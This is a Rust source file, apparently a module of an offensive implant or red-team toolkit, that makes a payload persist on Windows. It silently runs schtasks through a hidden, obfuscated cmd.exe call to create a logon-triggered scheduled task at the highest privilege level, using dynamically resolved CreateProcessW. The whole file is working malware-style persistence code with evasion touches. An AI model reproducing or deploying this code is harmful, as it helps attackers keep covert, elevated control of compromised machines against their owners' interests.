use crate::log::LogSink;
#[allow(unused_imports)]
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.name.is_empty() {
        return Err("task name is required".to_string());
    }
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }

    #[cfg(not(windows))]
    {
        let _ = log;
        return Err("requires Windows".to_string());
    }

    #[cfg(windows)]
    {
        let cmd = format!(
            "/c schtasks /Create /SC ONLOGON /TN \"{}\" /TR \"{}\" /RL HIGHEST /F",
            config.name, config.payload_path
        );

        log.step("Step 1: Create scheduled task");

        let cmd_exe_str = crate::obf::s(crate::obf::CMD_EXE);
        let app_wide: Vec<u16> = cmd_exe_str.encode_utf16().chain(std::iter::once(0)).collect();
        let mut cmd_wide: Vec<u16> = cmd.encode_utf16().chain(std::iter::once(0)).collect();

        #[repr(C)]
        struct StartupInfoW {
            cb: u32, _pad: [u8; 92],
        }
        #[repr(C)]
        struct ProcessInformation {
            process: *mut std::ffi::c_void,
            thread: *mut std::ffi::c_void,
            pid: u32, tid: u32,
        }

        unsafe {
            let mut si = std::mem::zeroed::<StartupInfoW>();
            si.cb = std::mem::size_of::<StartupInfoW>() as u32;
            let mut pi = std::mem::zeroed::<ProcessInformation>();

            let result = crate::resolve::CreateProcessW(
                app_wide.as_ptr(),
                cmd_wide.as_mut_ptr(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                0x08000000, // CREATE_NO_WINDOW
                std::ptr::null(),
                std::ptr::null(),
                &si as *const _ as *const std::ffi::c_void,
                &mut pi as *mut _ as *mut std::ffi::c_void,
            );

            if result == 0 {
                return Err("task creation process failed".to_string());
            }

            crate::resolve::WaitForSingleObject(pi.process, 10000);
            crate::resolve::CloseHandle(pi.process);
            crate::resolve::CloseHandle(pi.thread);
        }

        log.info(format!("  Scheduled: {} -> {}", config.name, config.payload_path));

        Ok(PersistResult {
            method: PersistMethod::ScheduledTask,
            description: format!("Task '{}' scheduled at logon", config.name),
        })
    }
}
